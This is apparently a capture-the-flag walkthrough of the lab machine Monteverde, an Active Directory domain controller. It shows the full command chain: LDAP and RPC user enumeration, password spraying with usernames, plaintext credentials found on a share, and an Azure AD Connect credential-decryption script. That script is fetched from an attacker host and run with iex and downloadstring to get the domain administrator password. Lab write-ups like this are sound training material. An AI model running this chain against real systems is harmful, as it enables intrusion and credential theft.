```
sudo nmap -sS -sV -p- 10.10.10.172
[sudo] password for wizardwalter: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-06 16:27 EDT
Nmap scan report for 10.10.10.172
Host is up (0.030s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-06 20:30:35Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49750/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows
```

lets get the domain as this is a AD box:
```
 ldapsearch -x -H ldap://10.10.10.172 -s base -LLL
dn:
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=MEGABANK,DC=LOCAL
ldapServiceName: MEGABANK.LOCAL:monteverde$@MEGABANK.LOCAL
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
...
```
`megabank.local`

next lets get the users:
```
ldapsearch -x -H ldap://10.10.10.172 -b "DC=megabank,DC=local" -LLL \
  "(&(objectCategory=person)(objectClass=user))" sAMAccountName | \
  awk '/^sAMAccountName: /{print $2}' > users.txt

Cat users.txt:
Guest
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
```
nice!

Could have also ran this:
```
rpcclient -U "" -N 10.10.10.172
```
```
rpcclient $> querydispinfo
index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2	Name: AAD_987d7f2f57d2	Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos	Name: Dimitris Galanos	Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope	Name: Mike Hope	Desc: (null)
index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary	Name: Ray O'Leary	Desc: (null)
index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs	Name: SABatchJobs	Desc: (null)
index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan	Name: Sally Morgan	Desc: (null)
index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata	Name: svc-ata	Desc: (null)
index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec	Name: svc-bexec	Desc: (null)
index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp	Name: svc-netapp	Desc: (null)
```
though the one above seems to have more output :D

now that we have list of users, lets dig deeper on each:
```
ldapsearch -H ldap://megabank.local -x -D "$U" -w "$P" -b DC=megabank,DC=local -LLL '(sAMAccountName=AAD_987d7f2f57d2)' '*'
```

```
dn: CN=AAD_987d7f2f57d2,CN=Users,DC=MEGABANK,DC=LOCAL
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: AAD_987d7f2f57d2
description: Service account for the Synchronization Service with installation
  identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVER
 DE.
distinguishedName: CN=AAD_987d7f2f57d2,CN=Users,DC=MEGABANK,DC=LOCAL
instanceType: 4
whenCreated: 20200102225324.0Z
whenChanged: 20250906202334.0Z
displayName: AAD_987d7f2f57d2
uSNCreated: 24593
memberOf: CN=Azure Admins,OU=Groups,DC=MEGABANK,DC=LOCAL
memberOf: CN=Users,CN=Builtin,DC=MEGABANK,DC=LOCAL
uSNChanged: 77891
name: AAD_987d7f2f57d2
objectGUID:: wwff5rF/aUiDrNahmRgjSw==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 134016638140163175
logonHours:: ////////////////////////////
pwdLastSet: 132224792049848969
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3UUAQAAA==
...
```

cool this is the account for the Synchronization Service, could be interesting... next i am gonna try and brute force with the usernames:
```
crackmapexec smb 10.10.10.172 -u users.txt -p users.txt --continue-on-success
```
```
...
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-ata STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:dgalanos STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:roleary STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:smorgan STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:svc-ata STATUS_LOGON_FAILURE 
...
```
`SABatchJobs`: `SABatchJobs`
NICE!

port 5985 is open lets try winrm in:
`evil-winrm -u SABatchJobs -p 'SABatchJobs' -i 10.10.10.172`
but failed...

lets move back to smb see if we can find anything:
```
smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs
```
```
 IP: 10.10.10.172:445	Name: 10.10.10.172        	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	azure_uploads                                     	READ ONLY	
	C$                                                	NO ACCESS	Default share
	E$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
	users$                                            	READ ONLY	
```

off rip that azure_uploads looks like a treat!
```
 smbclient -U 'SABatchJobs' //10.10.10.172/azure_uploads
Password for [WORKGROUP\SABatchJobs]: SABatchJobs
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jan  3 07:43:06 2020
  ..                                  D        0  Fri Jan  3 07:43:06 2020
```
nothing again...

```
smbclient -U 'SABatchJobs' //10.10.10.172/users$
```
```
\mhope\> ls
  .                                   D        0  Fri Jan  3 08:41:18 2020
  ..                                  D        0  Fri Jan  3 08:41:18 2020
  azure.xml                          AR     1212  Fri Jan  3 08:40:23 2020

mget azure.xml
Get file azure.xml? yes
```

welp lets check this out...

```
<Objs Version="1.1.0.1">
<Obj RefId="0">
<TN RefId="0">
<T>
Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential
</T>
<T>System.Object</T>
</TN>
<ToString>
Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential
</ToString>
<Props>
<DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
<DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
<G N="KeyId">00000000-0000-0000-0000-000000000000</G>
<S N="Password">4n0therD4y@n0th3r$</S>
</Props>
</Obj>
</Objs>
```
Password: `4n0therD4y@n0th3r$`

since this was in mhope dir, lets try winrm:
`evil-winrm -u mhope -p '4n0therD4y@n0th3r$' -i 10.10.10.172`
```
*Evil-WinRM* PS C:\Users\mhope\Desktop> cat user.txt
2603c8a98c1ac1b*********
```
User PWN!

---

### Priv Esc

Lets check the user's permissions with net user:
`net user mhope /domain`
```
User name                    mhope
Full Name                    Mike Hope
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/2/2020 4:40:05 PM
Password expires             Never
Password changeable          1/3/2020 4:40:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory               \\monteverde\users$\mhope
Last logon                   1/3/2020 6:29:59 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Azure Admins         *Domain Users

```
OR
`whoami /groups`
```
GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
MEGABANK\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

Azure admins maybe something interesting....
(has to do with syncing Active Directory information with the cloud based version)

i tried to upload PowerView and got this...
```
import-Module .\PowerView.ps1
At C:\Users\mhope\Desktop\PowerView.ps1:1 char:1
+ #requires -version 2
+ ~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
At C:\Users\mhope\Desktop\PowerView.ps1:1 char:1
+ #requires -version 2
+ ~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```
uh-oh...  

im gonna try winPEAS and sharphound see if it picks up on that
```
./winPEASx64.exe
Program 'winPEASx64.exe' failed to run: The specified executable is not a valid application for this OS platform.At line:1 char:1
```

welp we may need 32 bit version lol let me try sharphound tho...
```
/SharpHound.exe
2025-09-06T14:39:05.4850469-07:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2025-09-06T14:39:05.6725542-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices, LdapServices, WebClientService, SmbInfo
2025-09-06T14:39:05.7038077-07:00|INFORMATION|Initializing SharpHound at 2:39 PM on 9/6/2025
2025-09-06T14:39:05.7350408-07:00|INFORMATION|Resolved current domain to MEGABANK.LOCAL
2025-09-06T14:39:05.9071018-07:00|INFORMATION|Flags: Group, LocalAdmin,
...
```

worked!

lets upload this to bloodhound and take a look at this Azure Admins group...

welp not giving me much... i will google...
welp i found this artical:
`https://blog.xpnsec.com/azuread-connect-for-redteam/`

in program files i find these azure programs:
```
Microsoft Azure Active Directory Connect
Microsoft Azure Active Directory Connect Upgrader
Microsoft Azure AD Connect Health Sync Agent
Microsoft Azure AD Sync
```

from that blog post above:
```
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}
Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```

lets add this to the target and give it a run....

 wont let me upload so we will run this command instead after hosting the file on a python server:
 ```
iex(new-object net.webclient).downloadstring('http://10.10.14.4/Get-MSOLCredentials.ps1')
```
```
Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```

Now we can easily winrm as admin and pwn machine:
```
evil-winrm -u administrator -p 'd0m@in4dminyeah!' -i 10.10.10.172
...

cat ../Desktop/root.txt
2f4df95a6341e2****************
```

DC PWNED!